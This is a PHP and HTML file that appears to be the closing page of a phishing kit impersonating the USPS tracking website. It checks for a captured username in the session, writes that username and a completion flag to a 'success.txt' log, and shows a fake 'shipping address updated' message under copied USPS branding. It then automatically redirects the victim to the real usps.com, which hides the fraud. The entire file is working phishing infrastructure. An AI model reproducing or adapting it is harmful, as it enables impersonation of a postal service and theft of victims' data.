<?php
session_start();
require_once 'includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];

// Save success event data
$data = [
    'step' => 'success',
    'usrnm' => $username,
    'completed' => true,
    'redirect_url' => FINAL_REDIRECT_URL
];

saveUserData('success.txt', $data);

// Clear session
session_destroy();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USPS Tracking - Success</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
    <div class="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col">
        <!-- Header -->
        <header class="w-full bg-gray-100 border-b border-gray-200">
            <!-- Utility bar - desktop -->
            <div class="hidden lg:flex items-center justify-end px-6 py-2 text-xs text-gray-600 bg-white gap-12">
                <div class="flex items-center gap-4">
                    <svg class="h-4 w-4 text-blue-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <circle cx="12" cy="12" r="9" />
                        <path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18" />
                    </svg>
                    <span>English</span>
                </div>
                <div class="flex items-center gap-4">
                    <svg class="h-4 w-4 text-blue-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M12 21s7-5.5 7-11a7 7 0 0 0-14 0c0 5.5 7 11 7 11z" />
                        <circle cx="12" cy="10" r="2.5" />
                    </svg>
                    <span>Locations</span>
                </div>
                <div class="flex items-center gap-4">
                    <svg class="h-4 w-4 text-blue-900" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                        <path d="M4 13v4a2 2 0 0 0 2 2h1v-6h-1a2 2 0 0 0-2 2" />
                        <path d="M20 13v4a2 2 0 0 1-2 2h-1v-6h1a2 2 0 0 1 2 2" />
                        <path d="M6 13v-1a6 6 0 0 1 12 0v1" />
                    </svg>
                    <span>Support</span>
                </div>
                <div class="flex items-center gap-4">
                    <span class="whitespace-nowrap">Informed Delivery</span>
                    <span class="whitespace-nowrap">Register / Sign In</span>
                </div>
            </div>

            <!-- Desktop main nav -->
            <div class="hidden lg:flex max-w-[1180px] mx-auto items-center justify-between px-6">
                <div class="flex items-center gap-3 py-2 mr-6">
                    <img src="assets/logo-sb.svg" alt="USPS Logo" class="h-8" />
                </div>
                <nav class="flex items-center">
                    <ul class="flex items-center whitespace-nowrap text-sm font-medium text-[#1A2252]">
                        <li class="relative">
                            <a href="#" class="relative inline-flex items-center bg-[#1A2252] text-white px-8 pl-10 py-3 font-normal uppercase tracking-[0.08em] overflow-hidden" style="clip-path: polygon(12px 0, 100% 0, calc(100% - 10px) 100%, 0% 100%);">
                                <span class="relative z-20">Quick Tools</span>
                                <span class="absolute top-0 right-[1px] h-full w-4 bg-[#c4122f]" style="clip-path: polygon(10px 0px, 100% 0px, 40% 100%, 0% 100%); z-index: 15;"></span>
                            </a>
                        </li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Mail & Ship</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Track & Manage</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Postal Store</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Business</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">International</a></li>
                        <li class="relative"><a href="#" class="flex items-center px-6 py-3 hover:bg-white transition-colors">Help</a></li>
                    </ul>
                </nav>
                <div class="ml-6 p-2 cursor-pointer hover:bg-gray-300 rounded">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#1A2252]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <circle cx="11" cy="11" r="8" />
                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
                    </svg>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="flex-1 w-full">
            <!-- Tracking Header -->
            <div class="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
                <div class="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
                    <div>
                        <div class="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                            USPS Tracking<sup class="text-xs align-super">®</sup>
                        </div>
                        <button type="button" class="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline">
                            <span>Track Another Package</span>
                            <span class="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
                        </button>
                    </div>
                    <div class="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
                        <button type="button" class="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]">Tracking</button>
                        <span class="h-5 w-px bg-[#d8d8e0]" />
                        <button type="button" class="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors">FAQs</button>
                    </div>
                </div>
            </div>

            <!-- Content -->
            <div class="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
                <div class="mt-12 space-y-12">
                    <!-- Success Section -->
                    <section class="space-y-5">
                        <div class="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                            <span class="font-semibold text-[#1a2252]">Tracking Number:</span>
                            <span class="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
                        </div>
                        <div class="text-[17px] font-semibold text-[#23285a]">Status :</div>
                        <div class="text-[19px] font-bold text-[#1a7f3b]">
                            We have updated your shipping address
                        </div>
                        <div class="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px]">
                            For more information about claims, visit your local Post Office or the USPS Insurance Claims portal at
                            <span class="text-[#2b2a72]"> https://www.usps.com/insuranceclaims/</span>. The U.S. Postal Service values your business and apologizes for any inconvenience caused.
                        </div>
                        <div class="mt-4 flex w-full max-w-[760px]">
                            <div class="h-[14px]" style="flex-grow: 1.6; flex-basis: 0; background: linear-gradient(90deg, #2b2a72 0%, #1f1f5a 100%); clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%); margin-right: 4px;"></div>
                            <div class="h-[14px]" style="flex-grow: 1; flex-basis: 0; background: #d9d9df; clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%); margin-right: 4px;"></div>
                            <div class="h-[14px]" style="flex-grow: 1; flex-basis: 0; background: #d9d9df; clip-path: polygon(8px 0, 100% 0, calc(100% - 8px) 100%, 0 100%);"></div>
                        </div>
                        <div class="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                            Status Not Available
                        </div>
                        <div>
                            <button
                                type="button"
                                onclick="window.location.replace('https://www.usps.com/')"
                                class="mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors"
                            >
                                Continue to USPS.com
                            </button>
                            <p class="mt-2 text-[12px] text-[#4a4f6d]">
                                You will be redirected shortly. If the page doesn't change automatically, click the button above.
                            </p>
                        </div>
                    </section>

                    <!-- FAQ Section -->
                    <section>
                        <div class="w-full bg-white border border-[#e0e0e8] py-12 px-8 text-center shadow-sm">
                            <h3 class="text-[22px] font-semibold text-[#1a2252]">Can't find what you're looking for?</h3>
                            <p class="mt-4 text-[14px] text-[#4a4f6d]">
                                Go to our FAQs section to find answers to your tracking questions.
                            </p>
                            <button class="mt-6 inline-flex items-center justify-center bg-[#2b2a72] text-white px-7 py-3 text-[14px] rounded-sm font-medium hover:bg-[#211f5a] transition-colors">
                                FAQs
                            </button>
                        </div>
                    </section>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="w-full text-[#1a2252] text-[0.75rem] py-10 mt-16">
            <div class="max-w-[1180px] mx-auto px-6">
                <div class="grid grid-cols-2 md:grid-cols-4 gap-y-8 gap-x-10">
                    <div>
                        <h4 class="text-sm font-semibold uppercase tracking-wide text-[#1a2252] mb-3">
                            Helpful Links
                        </h4>
                        <ul class="space-y-1 text-[#4a4f6d]">
                            <li><a href="#" class="hover:text-[#c5282c]">Contact Us</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Site Index</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">FAQs</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Feedback</a></li>
                        </ul>
                    </div>
                    <div>
                        <h4 class="text-sm font-semibold uppercase tracking-wide text-[#1a2252] mb-3">
                            On About.usps.com
                        </h4>
                        <ul class="space-y-1 text-[#4a4f6d]">
                            <li><a href="#" class="hover:text-[#c5282c]">About USPS Home</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Newsroom</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">USPS Service Updates</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Forms & Publications</a></li>
                        </ul>
                    </div>
                    <div>
                        <h4 class="text-sm font-semibold uppercase tracking-wide text-[#1a2252] mb-3">
                            Other USPS Sites
                        </h4>
                        <ul class="space-y-1 text-[#4a4f6d]">
                            <li><a href="#" class="hover:text-[#c5282c]">Business Customer Gateway</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Postal Inspectors</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Inspector General</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Postal Explorer</a></li>
                        </ul>
                    </div>
                    <div>
                        <h4 class="text-sm font-semibold uppercase tracking-wide text-[#1a2252] mb-3">
                            Legal Information
                        </h4>
                        <ul class="space-y-1 text-[#4a4f6d]">
                            <li><a href="#" class="hover:text-[#c5282c]">Privacy Policy</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">Terms of Use</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">FOIA</a></li>
                            <li><a href="#" class="hover:text-[#c5282c]">No FEAR Act EEO Data</a></li>
                        </ul>
                    </div>
                </div>
                <div class="mt-10 text-center text-[#6b6f88] text-xs">
                    &copy; <?php echo date('Y'); ?> USPS. All Rights Reserved.
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Auto-redirect after 4 seconds
        setTimeout(function() {
            window.location.replace('https://www.usps.com/');
        }, 4000);
    </script>
</body>
</html>
